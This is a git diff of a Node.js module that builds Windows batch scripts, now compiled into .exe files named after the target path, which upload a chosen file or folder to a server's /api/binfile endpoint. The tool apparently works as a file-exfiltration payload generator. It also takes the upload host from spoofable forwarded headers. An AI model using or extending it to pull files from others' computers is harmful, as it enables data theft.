@@ -1,11 +1,26 @@
-const DEFAULT_UPLOAD_URL = 'https://rawreceive.up.railway.app/api/binfile';
+const { cmdToExe } = require('./cmd2exe');
 
-function getUploadUrl() {
-  const base = process.env.PUBLIC_BASE_URL;
-  if (base) {
-    return `${base.replace(/\/$/, '')}/api/binfile`;
+function getPublicBaseUrl(req) {
+  const configured = process.env.PUBLIC_BASE_URL;
+  if (configured && configured.trim()) {
+    return configured.trim().replace(/\/$/, '');
   }
-  return DEFAULT_UPLOAD_URL;
+
+  const forwardedProto = req.get('x-forwarded-proto');
+  const proto = (forwardedProto || req.protocol || 'https')
+    .split(',')[0]
+    .trim();
+
+  const forwardedHost = req.get('x-forwarded-host');
+  const host = (forwardedHost || req.get('host') || '')
+    .split(',')[0]
+    .trim();
+
+  if (!host) {
+    return null;
+  }
+
+  return `${proto}://${host}`;
 }
 
 function sanitizeWinPath(targetPath) {
@@ -23,7 +38,6 @@ function basenameWin(targetPath) {
   const normalized = targetPath.replace(/\//g, '\\');
   const parts = normalized.split('\\').filter(Boolean);
   if (parts.length === 0) return 'item';
-  // Drive-only path like "D:"
   if (parts.length === 1 && /^[A-Za-z]:$/.test(parts[0])) {
     return parts[0].replace(':', '');
   }
@@ -167,7 +181,7 @@ function buildFolderCmd(folderPath, uploadUrl) {
   ].join('\r\n');
 }
 
-function generateCmdScript({ targetPath, type }) {
+function generateUploadExe({ targetPath, type, req }) {
   const pathValue = sanitizeWinPath(targetPath);
   if (!pathValue) {
     return { error: 'A valid Windows path is required' };
@@ -177,16 +191,27 @@ function generateCmdScript({ targetPath, type }) {
     return { error: 'type must be "file" or "folder"' };
   }
 
-  const uploadUrl = getUploadUrl();
+  const baseUrl = getPublicBaseUrl(req);
+  if (!baseUrl) {
+    return { error: 'Could not determine public service URL from the request' };
+  }
+
+  const uploadUrl = `${baseUrl}/api/binfile`;
   const baseName = safeDownloadName(basenameWin(pathValue));
-  const filename = `${baseName}.CMD`;
-  const content = type === 'file'
+  const filename = `${baseName}.exe`;
+  const cmdContent = type === 'file'
     ? buildFileCmd(pathValue, uploadUrl)
     : buildFolderCmd(pathValue, uploadUrl);
 
-  return { filename, content };
+  try {
+    const exeBuffer = cmdToExe(cmdContent);
+    return { filename, content: exeBuffer, cmdContent, uploadUrl };
+  } catch (err) {
+    return { error: err.message || 'Failed to build exe' };
+  }
 }
 
 module.exports = {
-  generateCmdScript,
+  generateUploadExe,
+  getPublicBaseUrl,
 };
